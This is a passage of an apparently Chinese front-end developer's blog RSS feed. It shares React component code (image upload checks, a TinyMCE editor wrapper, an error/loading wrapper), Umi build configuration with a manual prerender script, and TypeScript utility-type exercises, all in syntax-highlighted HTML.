  <span>const</span> formData <span>=</span> <span>new</span> <span>FormData</span><span>(</span><span>)</span>
  formData<span>.</span><span>append</span><span>(</span>filename<span>!</span><span>,</span> file<span>)</span>
  <span>UploadImage</span><span>(</span>formData<span>,</span> <span>{</span>
    onUploadProgress<span>:</span> onProgress<span>,</span>
  <span>}</span><span>)</span>
    <span>.</span><span>then</span><span>(</span><span>(</span><span>{</span> data <span>}</span><span>)</span> <span>=></span> onSuccess<span>?.</span><span>(</span>data<span>?.</span><span>[</span><span>0</span><span>]</span><span>)</span><span>)</span>
    <span>.</span><span>catch</span><span>(</span>onError<span>)</span>
<span>}</span>

<span>type</span> <span>GenerateBeforeUpload</span> <span>=</span> <span>(</span>params<span>?</span><span>:</span> <span>{</span>
  fileType<span>?</span><span>:</span> <span>string</span><span>[</span><span>]</span> <span>|</span> <span>null</span>
  fileSize<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>null</span>
<span>}</span><span>)</span> <span>=></span> UploadProps<span>[</span><span>'beforeUpload'</span><span>]</span>

<span>export</span> <span>const</span> generateBeforeUpload<span>:</span> <span>GenerateBeforeUpload</span> <span>=</span> <span>(</span><span>{</span>
  fileType<span>,</span>
  fileSize<span>,</span>
<span>}</span> <span>=</span> <span>{</span><span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>(</span><span>{</span> type<span>,</span> size <span>}</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>fileType<span>?.</span>length <span>&amp;&amp;</span> <span>!</span>fileType<span>.</span><span>some</span><span>(</span>i <span>=></span> type <span>===</span> <span>lookup</span><span>(</span>i<span>)</span><span>)</span><span>)</span> <span>{</span>
      message<span>.</span><span>warning</span><span>(</span><span><span>`</span><span>仅支持</span><span><span>${</span>fileType<span>.</span><span>join</span><span>(</span><span>'、'</span><span>)</span><span>}</span></span><span>图片类型</span><span>`</span></span><span>)</span>
      <span>return</span> <span>false</span>
    <span>}</span>

    <span>if</span> <span>(</span>fileSize <span>&amp;&amp;</span> size <span>></span> fileSize <span>*</span> <span>1024</span> <span>*</span> <span>1024</span><span>)</span> <span>{</span>
      message<span>.</span><span>warning</span><span>(</span><span><span>`</span><span>图片大小不能超过</span><span><span>${</span>fileSize<span>}</span></span><span>M</span><span>`</span></span><span>)</span>
      <span>return</span> <span>false</span>
    <span>}</span>

    <span>return</span> <span>true</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br></div></div><h2 id="_3-tinymce"> 3. Tinymce</h2>
<ul>
<li>
<p>富文本编辑器（<a href="https://www.tiny.cloud/docs/tinymce/6/" target="_blank" rel="noopener noreferrer">Tinymce</a>）</p>
<blockquote>
<p>public 放入下载的 <a href="https://www.tiny.cloud/get-tiny/" target="_blank" rel="noopener noreferrer">Tinymce SDK</a> 文件，<a href="https://www.tiny.cloud/get-tiny/language-packages/" target="_blank" rel="noopener noreferrer">langs</a> 目录下放入需要转换的语言，接着配置 <code>tinymceScriptSrc</code> 路径和<code>language</code> 语言。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> Editor <span>}</span> <span>from</span> <span>'@tinymce/tinymce-react'</span>
<span>import</span> type <span>{</span> IAllProps <span>}</span> <span>from</span> <span>'@tinymce/tinymce-react'</span>
<span>import</span> <span>{</span> lookup <span>}</span> <span>from</span> <span>'mime-types'</span>
<span>import</span> type <span>{</span> TinyMCE <span>}</span> <span>from</span> <span>'tinymce'</span>
<span>import</span> <span>{</span> UploadImage <span>}</span> <span>from</span> <span>'@/services/pusheng/OtherService'</span>

type UploadHandler <span>=</span> Parameters<span>&lt;</span>TinyMCE<span>[</span><span>'init'</span><span>]</span><span>></span><span>[</span><span>0</span><span>]</span><span>[</span><span>'images_upload_handler'</span><span>]</span>

<span>export</span> type TinymceProps <span>=</span> Omit<span>&lt;</span>IAllProps<span>,</span> <span>'onChange'</span><span>></span> <span>&amp;</span> <span>{</span>
  <span>/**
   * @name 上传图片类型
   * @default ['jpg', 'png', 'webp']
   */</span>
  fileType<span>?</span><span>:</span> string<span>[</span><span>]</span>
  <span>/**
   * @name 限制上传图片大小
   * @desc 单位：M
   * @default 5
   */</span>
  fileSize<span>?</span><span>:</span> number
  onChange<span>?</span><span>:</span> <span>(</span><span><span>content</span><span>:</span> string</span><span>)</span> <span>=></span> <span>void</span>
<span>}</span>

<span>const</span> <span>Tinymce</span><span>:</span> React<span>.</span><span>FC</span><span><span><span>&lt;</span><span>TinymceProps</span></span><span>></span></span><span> = (</span><span>{</span>
  init<span>,</span>
  fileType <span>=</span> <span>[</span><span>'jpg'</span><span>,</span> <span>'png'</span><span>,</span> <span>'webp'</span><span>]</span><span>,</span>
  fileSize <span>=</span> <span>5</span><span>,</span>
  onChange<span>,</span>
  <span>...</span>rest
<span>}</span><span>) => </span><span>{</span>
  <span>const</span> <span>beforeUpload</span> <span>=</span> <span>async</span> <span>(</span><span><span>{</span> type<span>,</span> size <span>}</span><span>:</span> Blob</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>fileType<span>?.</span>length <span>&amp;&amp;</span> <span>!</span>fileType<span>.</span><span>some</span><span>(</span><span>i</span> <span>=></span> type <span>===</span> <span>lookup</span><span>(</span>i<span>)</span><span>)</span><span>)</span> <span>{</span>
      <span>throw</span> <span>Error</span><span>(</span><span><span>`</span><span>仅支持</span><span><span>${</span>fileType<span>.</span><span>join</span><span>(</span><span>'、'</span><span>)</span><span>}</span></span><span>图片类型</span><span>`</span></span><span>)</span>
    <span>}</span>

    <span>if</span> <span>(</span>fileSize <span>&amp;&amp;</span> size <span>></span> fileSize <span>*</span> <span>1024</span> <span>*</span> <span>1024</span><span>)</span> <span>{</span>
      <span>throw</span> <span>Error</span><span>(</span><span><span>`</span><span>图片大小不能超过</span><span><span>${</span>fileSize<span>}</span></span><span>M</span><span>`</span></span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>uploadImage</span><span>:</span> <span>UploadHandler</span> <span>=</span> <span>async</span> <span>(</span><span><span>{</span> blob<span>,</span> name <span>}</span><span>,</span> progress</span><span>)</span> <span>=></span> <span>{</span>
    <span>await</span> <span>beforeUpload</span><span>(</span><span>blob</span><span>(</span><span>)</span><span>)</span>
    <span>const</span> formData <span>=</span> <span>new</span> <span>FormData</span><span>(</span><span>)</span>
    formData<span>.</span><span>append</span><span>(</span><span>name</span><span>(</span><span>)</span><span>,</span> <span>blob</span><span>(</span><span>)</span><span>)</span>
    <span>const</span> <span>{</span> data <span>}</span> <span>=</span> <span>await</span> <span>UploadImage</span><span>(</span>formData<span>,</span> <span>{</span>
      <span>onUploadProgress</span><span>:</span> <span>(</span><span><span>{</span> loaded<span>,</span> total <span>}</span><span>:</span> ProgressEvent</span><span>)</span> <span>=></span>
        <span>progress</span><span>(</span><span>(</span>loaded <span>/</span> total<span>)</span> <span>*</span> <span>100</span><span>)</span><span>,</span>
    <span>}</span><span>)</span>
    <span>return</span> data<span>?.</span><span>[</span><span>0</span><span>]</span> <span>as</span> string
  <span>}</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Editor</span></span>
      <span>tinymceScriptSrc</span><span><span>=</span><span>'</span>/tinymce/tinymce.min.js<span>'</span></span>
      <span>init</span><span><span>=</span><span>{</span><span>{</span>
        <span>height</span><span>:</span> <span>500</span><span>,</span>
        <span>menubar</span><span>:</span> <span>false</span><span>,</span>
        <span>language</span><span>:</span> <span>'zh-Hans'</span><span>,</span>
        <span>images_reuse_filename</span><span>:</span> <span>true</span><span>,</span>
        <span>images_upload_handler</span><span>:</span> uploadImage<span>,</span>
        <span>plugins</span><span>:</span> <span>[</span>
          <span>'advlist'</span><span>,</span>
          <span>'autolink'</span><span>,</span>
          <span>'lists'</span><span>,</span>
          <span>'link'</span><span>,</span>
          <span>'image'</span><span>,</span>
          <span>'charmap'</span><span>,</span>
          <span>'anchor'</span><span>,</span>
          <span>'searchreplace'</span><span>,</span>
          <span>'visualblocks'</span><span>,</span>
          <span>'code'</span><span>,</span>
          <span>'fullscreen'</span><span>,</span>
          <span>'insertdatetime'</span><span>,</span>
          <span>'media'</span><span>,</span>
          <span>'table'</span><span>,</span>
          <span>'preview'</span><span>,</span>
          <span>'help'</span><span>,</span>
          <span>'wordcount'</span><span>,</span>
        <span>]</span><span>,</span>
        <span>toolbar</span><span>:</span> <span><span>`</span><span>undo redo | forecolor  backcolor | bold italic underline strikethrough | alignleft aligncenter alignright alignjustify | bullist numlist outdent indent lineheight | removeformat charmap table link image insertdatetime fullscreen</span><span>`</span></span><span>,</span>
        <span>contextmenu</span><span>:</span> <span>'link image imagetools table spellchecker bold copy'</span><span>,</span>
        <span>content_style</span><span>:</span>
          <span>'body { font-family: system-ui, —apple-system, Segoe UI, Rototo, Emoji, Helvetica, Arial,sans-serif; font-size:14px }'</span><span>,</span>
        <span>placeholder</span><span>:</span> <span>'请输入'</span><span>,</span>
        <span>...</span>init<span>,</span>
      <span>}</span><span>}</span></span>
      <span>onEditorChange</span><span><span>=</span><span>{</span><span>content</span> <span>=></span> onChange<span>?.</span><span>(</span>content<span>)</span><span>}</span></span>
      <span><span>{</span><span>...</span>rest<span>}</span></span>
    <span>/></span></span>
  <span>)</span>
<span>}</span><span>

export default Tinymce
</span></code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br></div></div><ul>
<li>ProFormTinymce</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> ProForm <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> <span>type</span> <span>{</span> ProFormItemProps <span>}</span> <span>from</span> <span>'@ant-design/pro-components'</span>
<span>import</span> Tinymcefrom <span>from</span> <span>'./index'</span>
<span>import</span> <span>type</span> <span>{</span> TinymceProps <span>}</span> <span>from</span> <span>'./index'</span>

<span>type</span> <span>ProFormTinymceProps</span> <span>=</span> ProFormItemProps <span>&amp;</span> <span>{</span>
  fieldProps<span>?</span><span>:</span> TinymceProps
<span>}</span>

<span>const</span> ProFormTinymce<span>:</span> React<span>.</span><span>FC</span><span>&lt;</span>ProFormTinymceProps<span>></span> <span>=</span> <span>(</span><span>{</span>
  fieldProps<span>,</span>
  <span>...</span>rest
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>ProForm.Item</span></span> <span><span>{</span><span>...</span>rest<span>}</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span><span>Tinymcefrom</span></span> <span><span>{</span><span>...</span>fieldProps<span>}</span></span> <span>/></span></span><span>
    </span><span><span><span>&lt;/</span><span>ProForm.Item</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ProFormTinymce
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h2 id="_4-errorandloading"> 4. ErrorAndLoading</h2>
<div><pre><code><span>import</span> <span>{</span> Alert<span>,</span> Button<span>,</span> Spin <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>type</span> <span>{</span> AlertProps<span>,</span> SpinProps <span>}</span> <span>from</span> <span>'antd'</span>

<span>interface</span> <span>ErrorAndLoadingProps</span> <span>{</span>
  error<span>?</span><span>:</span> Error <span>|</span> <span>string</span>
  loading<span>?</span><span>:</span> <span>boolean</span>
  <span>/**
   * @name 是否使用Spin组件包裹
   * @default true
   */</span>
  isWrap<span>?</span><span>:</span> <span>boolean</span>
  onRetry<span>?</span><span>:</span> <span>(</span><span>...</span>params<span>:</span> <span>any</span><span>)</span> <span>=></span> <span>any</span>
  spinProps<span>?</span><span>:</span> SpinProps
  alertProps<span>?</span><span>:</span> AlertProps
<span>}</span>

<span>const</span> ErrorAndLoading<span>:</span> React<span>.</span><span>FC</span><span>&lt;</span>ErrorAndLoadingProps<span>></span> <span>=</span> <span>(</span><span>{</span>
  error<span>,</span>
  loading <span>=</span> <span>false</span><span>,</span>
  isWrap <span>=</span> <span>true</span><span>,</span>
  onRetry<span>,</span>
  children<span>,</span>
  spinProps<span>,</span>
  alertProps<span>,</span>
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>isWrap <span>&amp;&amp;</span> <span>!</span>error <span>&amp;&amp;</span> <span>!</span>loading<span>)</span> <span>return</span> <span><span><span>&lt;</span></span><span>></span></span><span>{</span>children<span>}</span><span><span><span>&lt;/</span></span><span>></span></span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Spin</span></span> <span>spinning</span><span><span>=</span><span>{</span>loading<span>}</span></span> <span><span>{</span><span>...</span>spinProps<span>}</span></span><span>></span></span><span>
      </span><span>{</span>isWrap <span>&amp;&amp;</span> <span>!</span>error <span>&amp;&amp;</span> children<span>}</span><span>
      </span><span>{</span>error <span>&amp;&amp;</span> <span>(</span>
        <span><span><span>&lt;</span><span>Alert</span></span>
          <span>showIcon</span>
          <span>type</span><span><span>=</span><span>'</span>error<span>'</span></span>
          <span>message</span><span><span>=</span><span>'</span>Request Error<span>'</span></span>
          <span>description</span><span><span>=</span><span>{</span>
            <span>(</span><span>typeof</span> error <span>===</span> <span>'string'</span> <span>?</span> error <span>:</span> error<span>?.</span>message<span>)</span> <span>||</span>
            <span>'暂无错误信息'</span>
          <span>}</span></span>
          <span>action</span><span><span>=</span><span>{</span>
            <span><span><span>&lt;</span><span>Button</span></span> <span>danger</span> <span>loading</span><span><span>=</span><span>{</span>loading<span>}</span></span> <span>onClick</span><span><span>=</span><span>{</span>onRetry<span>}</span></span><span>></span></span><span>
              重试
            </span><span><span><span>&lt;/</span><span>Button</span></span><span>></span></span>
          <span>}</span></span>
          <span><span>{</span><span>...</span>alertProps<span>}</span></span>
        <span>/></span></span>
      <span>)</span><span>}</span><span>
    </span><span><span><span>&lt;/</span><span>Spin</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ErrorAndLoading
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Config</title>
      <link>https://www.matrixtheone.ga/web/note/React/Config/</link>
      <guid>https://www.matrixtheone.ga/web/note/React/Config/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Config</source>
      <category>React</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-umi-排除-antd-打包"> 1. Umi 排除 Antd 打包</h2>
<ul>
<li>externalAntd.js</li>
</ul>
<div><pre><code><span>import</span> <span>*</span> <span>as</span> antd <span>from</span> <span>'antd'</span>
<span>import</span> <span>{</span> kebabCase <span>}</span> <span>from</span> <span>'lodash'</span>

<span>const</span> externalsAntd<span>:</span> Record<span>&lt;</span><span>string</span><span>,</span> <span>string</span><span>></span> <span>=</span> <span>{</span><span>}</span>
<span>for</span> <span>(</span><span>const</span> key <span>in</span> antd<span>)</span> <span>{</span>
  <span>if</span> <span>(</span>Object<span>.</span><span>hasOwnProperty</span><span>.</span><span>call</span><span>(</span>antd<span>,</span> key<span>)</span><span>)</span> <span>{</span>
    externalsAntd<span>[</span><span><span>`</span><span>antd/es/</span><span><span>${</span><span>kebabCase</span><span>(</span>key<span>)</span><span>}</span></span><span>`</span></span><span>]</span> <span>=</span> <span><span>`</span><span>window.antd.</span><span><span>${</span>key<span>}</span></span><span>`</span></span>
  <span>}</span>
<span>}</span>

<span>export</span> <span>default</span> externalsAntd
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>config.prod.ts</li>
</ul>
<div><pre><code><span>import</span> externalsAntd <span>from</span> <span>'./externalAntd'</span>

<span>export</span> <span>default</span> <span>defineConfig</span><span>(</span><span>{</span>
  <span>externals</span><span>:</span> <span>{</span>
    <span>...</span>externalsAntd<span>,</span>
  <span>}</span><span>,</span>
  <span>scripts</span><span>:</span> <span>[</span><span>'//cdn.jsdelivr.net/npm/antd@4.18.7/dist/antd.min.js'</span><span>]</span><span>,</span>
  <span>styles</span><span>:</span> <span>[</span><span>'//cdn.jsdelivr.net/npm/antd@4.18.7/dist/antd.min.css'</span><span>]</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_2-手工预渲染"> 2. 手工预渲染</h2>
<ul>
<li>因 Umi 预渲染失败，控制台报错，查询无果后而为之。</li>
</ul>
<div><pre><code><span>const</span> <span>{</span> join <span>}</span> <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>
<span>const</span> <span>{</span> readFile<span>,</span> writeFile <span>}</span> <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span>

<span>const</span> areaData <span>=</span> <span>require</span><span>(</span><span>'../src/assets/data/area.json'</span><span>)</span>
<span>const</span> heroData <span>=</span> <span>require</span><span>(</span><span>'../src/assets/data/hero.json'</span><span>)</span>

<span>const</span> areaPath <span>=</span> areaData<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span><span>`</span><span>area/</span><span><span>${</span>i<span>.</span>id<span>}</span></span><span>`</span></span><span>)</span>
<span>const</span> heroPath <span>=</span> heroData<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span><span>`</span><span>hero/</span><span><span>${</span>i<span>.</span>id<span>}</span></span><span>`</span></span><span>)</span>
<span>const</span> heroBiographyPath <span>=</span> heroData<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span><span>`</span><span>hero/biography/</span><span><span>${</span>i<span>.</span>id<span>}</span></span><span>`</span></span><span>)</span>

<span>const</span> pagePath <span>=</span> <span>[</span>
  <span>''</span><span>,</span>
  <span>'blind-box'</span><span>,</span>
  <span>'nfts'</span><span>,</span>
  <span>'market'</span><span>,</span>
  <span>...</span>areaPath<span>,</span>
  <span>...</span>heroPath<span>,</span>
  <span>...</span>heroBiographyPath<span>,</span>
<span>]</span>

pagePath<span>.</span><span>map</span><span>(</span><span>path</span> <span>=></span> <span>{</span>
  <span>const</span> distPath <span>=</span> <span>join</span><span>(</span>__dirname<span>,</span> <span>'../dist/'</span><span>,</span> path<span>,</span> <span>'/index.html'</span><span>)</span>
  <span>readFile</span><span>(</span>distPath<span>,</span> <span>(</span><span>err<span>,</span> html</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>err<span>)</span> <span>return</span> console<span>.</span><span>error</span><span>(</span>err<span>)</span>

    <span>readFile</span><span>(</span><span>join</span><span>(</span>__dirname<span>,</span> <span><span>`</span><span><span>${</span>path <span>||</span> <span>'index'</span><span>}</span></span><span>.txt</span><span>`</span></span><span>)</span><span>,</span> <span>(</span><span>err<span>,</span> txt</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>err<span>)</span> <span>return</span> console<span>.</span><span>error</span><span>(</span>err<span>)</span>

      <span>const</span> newHtml <span>=</span> html<span>.</span><span>toString</span><span>(</span><span>)</span><span>.</span><span>replace</span><span>(</span>
        <span>'&lt;div id="root">'</span><span>,</span>
        <span><span>`</span><span>&lt;div id="root">&lt;section style="position: absolute; left: -99999px"></span><span><span>${</span>txt
          <span>.</span><span>toString</span><span>(</span><span>)</span>
          <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(&lt;img.*?(?:>|\/>))|(?&lt;= )(class|style)=".*?"|</span><span>/</span><span>g</span></span><span>,</span> <span>''</span><span>)</span>
          <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>&lt;div(.*?)></span><span>/</span><span>g</span></span><span>,</span> <span>'&lt;div>'</span><span>)</span><span>}</span></span><span>&lt;/section></span><span>`</span></span>
      <span>)</span>
      <span>writeFile</span><span>(</span>distPath<span>,</span> newHtml<span>,</span> console<span>.</span>log<span>)</span>
    <span>}</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>React</title>
      <link>https://www.matrixtheone.ga/web/note/React/</link>
      <guid>https://www.matrixtheone.ga/web/note/React/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">React</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/星际穿越.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>TS</title>
      <link>https://www.matrixtheone.ga/web/note/TS/</link>
      <guid>https://www.matrixtheone.ga/web/note/TS/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">TS</source>
      <category>TS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-类型查看展开"> 1. <a href="https://stackoverflow.com/questions/57683303/how-can-i-see-the-full-expanded-contract-of-a-typescript-type/57683652" target="_blank" rel="noopener noreferrer">类型查看展开</a></h2>
<div><pre><code><span>type</span> <span>Expand<span>&lt;</span><span>T</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span><span>infer</span></span> <span>O</span> <span>?</span> <span>{</span> <span>[</span><span>K</span> <span>in</span> <span>keyof</span> <span>O</span><span>]</span><span>:</span> <span>O</span><span>[</span><span>K</span><span>]</span> <span>}</span> <span>:</span> <span>never</span>

<span>type</span> <span>ExpandRecursively<span>&lt;</span><span>T</span><span>></span></span> <span>=</span> <span>T</span> <span>extends</span> <span>object</span>
  <span>?</span> <span>T</span> <span>extends</span> <span><span>infer</span></span> <span>O</span>
    <span>?</span> <span>{</span> <span>[</span><span>K</span> <span>in</span> <span>keyof</span> <span>O</span><span>]</span><span>:</span> ExpandRecursively<span>&lt;</span><span>O</span><span>[</span><span>K</span><span>]</span><span>></span> <span>}</span>
    <span>:</span> <span>never</span>
  <span>:</span> <span>T</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_2-pick"> 2. Pick</h2>
<div><pre><code><span>type</span> <span>MyPick<span>&lt;</span><span>T</span><span>,</span> <span>K</span> <span>extends</span> <span>keyof</span> <span>T</span><span>></span></span> <span>=</span> <span>{</span>
  <span>[</span><span>P</span> <span>in</span> <span>K</span><span>]</span><span>:</span> <span>T</span><span>[</span><span>P</span><span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>interface</span> <span>Todo</span> <span>{</span>
  title<span>:</span> <span>string</span>
  description<span>:</span> <span>string</span>
  completed<span>:</span> <span>boolean</span>
<span>}</span>

<span>type</span> <span>TodoPreview</span> <span>=</span> MyPick<span>&lt;</span>Todo<span>,</span> <span>'title'</span> <span>|</span> <span>'completed'</span><span>></span>

<span>const</span> todo<span>:</span> TodoPreview <span>=</span> <span>{</span>
  title<span>:</span> <span>'Clean room'</span><span>,</span>
  completed<span>:</span> <span>false</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_3-readonly"> 3. Readonly</h2>
<div><pre><code><span>type</span> <span>MyReadonly<span>&lt;</span><span>T</span><span>></span></span> <span>=</span> <span>{</span>
  <span>readonly</span> <span>[</span><span>P</span> <span>in</span> <span>keyof</span> <span>T</span><span>]</span><span>:</span> <span>T</span><span>[</span><span>P</span><span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>interface</span> <span>Todo</span> <span>{</span>
  title<span>:</span> <span>string</span>
  description<span>:</span> <span>string</span>
<span>}</span>

<span>const</span> todo<span>:</span> MyReadonly<span>&lt;</span>Todo<span>></span> <span>=</span> <span>{</span>
  title<span>:</span> <span>'Hey'</span><span>,</span>
  description<span>:</span> <span>'foobar'</span><span>,</span>
<span>}</span>

todo<span>.</span>title <span>=</span> <span>'Hello'</span> <span>// Error: cannot reassign a readonly property</span>
todo<span>.</span>description <span>=</span> <span>'barFoo'</span> <span>// Error: cannot reassign a readonly property</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_4-元祖转换为对象"> 4. 元祖转换为对象</h2>
<div><pre><code><span>type</span> <span>TupleToObject<span>&lt;</span><span>T</span> <span>extends</span> <span>readonly</span> <span>any</span><span>[</span><span>]</span><span>></span></span> <span>=</span> <span>{</span>
  <span>[</span><span>P</span> <span>in</span> <span>T</span><span>[</span><span>number</span><span>]</span><span>]</span><span>:</span> <span>P</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>Example</li>
</ul>
<div><pre><code><span>const</span> tuple <span>=</span> <span>[</span><span>'tesla'</span><span>,</span> <span>'model 3'</span><span>,</span> <span>'model X'</span><span>,</span> <span>'model Y'</span><span>]</span> <span>as</span> <span>const</span>

<span>type</span> <span>result</span> <span>=</span> TupleToObject<span>&lt;</span><span>typeof</span> tuple<span>></span> <span>// expected { tesla: 'tesla', 'model 3': 'model 3', 'model X': 'model X', 'model Y': 'model Y'}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_5-第一个元素"> 5. 第一个元素</h2>
